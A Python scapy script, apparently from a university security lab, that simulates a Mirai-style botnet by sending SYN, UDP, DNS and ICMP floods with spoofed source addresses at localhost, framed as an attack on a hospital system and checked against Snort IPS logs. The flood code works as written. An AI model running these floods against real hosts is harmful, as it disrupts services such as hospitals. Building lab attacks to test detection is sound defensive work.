from scapy.all import *
import time

TARGET = "127.0.0.1"

def banner():
    print("=" * 60)
    print("ELEC0138 - DDoS/Botnet Attack Simulation")
    print("=" * 60)

def syn_flood():
    print("\n[PHASE 1] Launching SYN Flood Attack")
    print(f"Target: {TARGET}:8080 (EHR System)")
    print("Simulating Mirai botnet - randomised source IPs")
    print("Sending 1000 packets...")
    send(
        IP(dst=TARGET, src=RandIP()) /
        TCP(dport=8080, flags="S", sport=RandShort()),
        count=1000,
        verbose=0
    )
    print("[PHASE 1] SYN Flood complete - 1000 packets sent")

def udp_flood():
    print("\n[PHASE 2] Launching UDP Flood Attack")
    print(f"Target: {TARGET} (Hospital Infrastructure)")
    print("Simulating Mirai botnet - randomised source IPs")
    print("Sending 1000 packets...")
    send(
        IP(dst=TARGET, src=RandIP()) /
        UDP(dport=RandShort(), sport=RandShort()),
        count=1000,
        verbose=0
    )
    print("[PHASE 2] UDP Flood complete - 1000 packets sent")

def dns_flood():
    print("\n[PHASE 3] Launching DNS Flood Attack")
    print(f"Target: {TARGET}:53 (Hospital DNS Server)")
    print("Target domain: hospital.nhs.uk")
    print("Sending 1000 packets...")
    send(
        IP(dst=TARGET) /
        UDP(dport=53) /
        DNS(rd=1, qd=DNSQR(qname="hospital.nhs.uk")),
        count=1000,
        verbose=0
    )
    print("[PHASE 3] DNS Flood complete - 1000 packets sent")

def icmp_flood():
    print("\n[PHASE 4] Launching ICMP Flood Attack")
    print(f"Target: {TARGET} (Hospital Network)")
    print("Sending 1000 packets...")
    send(
        IP(dst=TARGET, src=RandIP()) /
        ICMP(),
        count=1000,
        verbose=0
    )
    print("[PHASE 4] ICMP Flood complete - 1000 packets sent")

banner()
print("\nStarting attack sequence in 3 seconds...")
print("Watch the dashboard at http://localhost:5000")
time.sleep(3)

syn_flood()
time.sleep(2)

udp_flood()
time.sleep(2)

dns_flood()
time.sleep(2)

icmp_flood()

print("Attack sequence complete")
print("Total packets sent: 4000")
print("Check Snort IPS logs for detection results")